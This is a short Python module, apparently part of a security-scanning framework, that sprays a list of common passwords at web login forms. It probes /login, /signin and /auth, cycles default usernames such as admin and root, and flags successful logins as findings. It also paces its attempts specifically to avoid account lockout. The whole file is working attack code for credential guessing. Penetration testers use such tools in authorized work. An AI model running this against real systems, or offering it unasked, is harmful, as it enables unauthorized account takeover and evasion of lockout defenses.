"""Password spraying with lockout awareness."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse, time

COMMON_PASSWORDS = ["Password1", "Welcome1", "Spring2024", "Summer2024", "Company123", "Admin123", "Password123"]

def spray(url, usernames, passwords=None):
    findings = []
    parsed = urllib.parse.urlparse(url)
    passwords = passwords or COMMON_PASSWORDS
    for pwd in passwords:
        for user in usernames[:50]:
            resp = post(url, data={"username": user, "password": pwd, "user": user, "pass": pwd})
            if resp.status == 0:
                continue
            text = (resp.text or "").lower()
            if "welcome" in text or "dashboard" in text or "success" in text or resp.status == 302:
                if "invalid" not in text and "error" not in text and "fail" not in text:
                    findings.append(Finding(
                        id="spray-{}-{}".format(user, hash(url) & 0xffff),
                        target=parsed.netloc,
                        type="Password Spray Hit",
                        severity="high",
                        url=url,
                        parameter="username/password",
                        payload="{}:{}".format(user, pwd),
                        evidence="Login succeeded",
                        response_snippet=resp.snippet(200),
                        confidence=0.7,
                    ))
        time.sleep(0.5)  # lockout avoidance
    log_event(parsed.netloc, "password_spray", {"url": url, "findings": len(findings)})
    return findings

def scan_base(base_url):
    # basic: try default usernames
    users = ["admin", "administrator", "root", "user", "test", "guest"]
    parsed = urllib.parse.urlparse(base_url)
    root = "{}://{}".format(parsed.scheme, parsed.netloc)
    for path in ["/login", "/signin", "/auth"]:
        url = root + path
        r = get(url)
        if r.status == 200:
            return spray(url, users)
    return []
